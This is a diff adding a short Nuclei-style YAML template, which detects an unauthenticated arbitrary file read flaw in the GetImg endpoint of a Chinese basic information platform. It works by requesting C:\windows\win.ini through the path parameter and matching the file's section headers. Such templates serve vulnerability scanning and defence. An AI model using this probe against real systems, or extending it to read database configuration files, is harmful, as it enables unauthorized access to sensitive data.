@@ -1,0 +1,21 @@
+id: ddxx-GetImg-lfi
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 地大信息-基础信息平台 GetImg 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取文件、数据库配置文件等等。
+  reference:
+    - https://github.com/wy876/POC/commit/3a4f16b676ac62a239914471a62c8daac33e51fc#diff-2aeb84aab6f285f703da67e3c13a6931d678ea3aa836ae17732ef1c5922293e3R12
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/SystemManage/BaseProject/GetImg?path=C:\windows\win.ini"
+      
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\\[(font|extension|file)s\\]"          
